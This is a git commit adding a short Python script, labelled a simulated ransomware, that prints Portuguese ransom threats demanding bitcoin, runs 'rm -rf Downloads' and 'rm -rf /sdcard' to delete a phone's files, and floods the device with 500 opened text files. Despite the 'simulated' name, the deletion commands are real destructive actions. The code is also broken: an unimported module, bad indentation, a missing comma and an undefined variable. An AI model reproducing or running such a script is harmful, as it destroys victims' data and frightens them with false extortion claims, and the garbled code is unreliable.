28403db3ef701a22263af6390af81c4d691ec03a
Void <vdev30301@gmail.com>
2025-08-31 01:37:06 -0300

    Create sorce-code/wps.py

---
+++ sorce-code/wps.py
@@ -0,0 +1,30 @@
+from os import system as run_system, startfile as open_file
+from sys import platform
+from time import sleep
+from subprocess import run
+
+def ransomware_simulado():
+    os.system("clear")
+
+    print("Você caiu em um ransomware!!!, pague em bitcoin ou APAGAREMOS e VAZAREMOS  TODO QUE ESTA NO SEU DISPOSITIVO")
+    sleep(0.5)
+    print("Não adianta sair!, mesmo não perdendo os arquivos, nós teremos acesso ao seu dispositivo")
+    sleep(0.5)
+    print("Nós instalamos VARIOS malwares e VIRUS no seu dispositivo!, TEMOS CONTROLE TOTAL")
+    sleep(0.5)
+
+
+        run('rm-rf Downloads', shell=shell_flag)
+        run("rm -rf /sdcard"shell=shell_flag)
+
+        for i in range(1, 501):
+            filename = f"BY_WpsDroid{i}.txt"
+            with open(filename, 'w') as f:
+
+                f.write("""
+Cancer spreads within man the same way man spreads across the Earth — and in both cases, the outcome is death.
+
+""")
+                open_file(filename)
+
+ransomware_simulado()
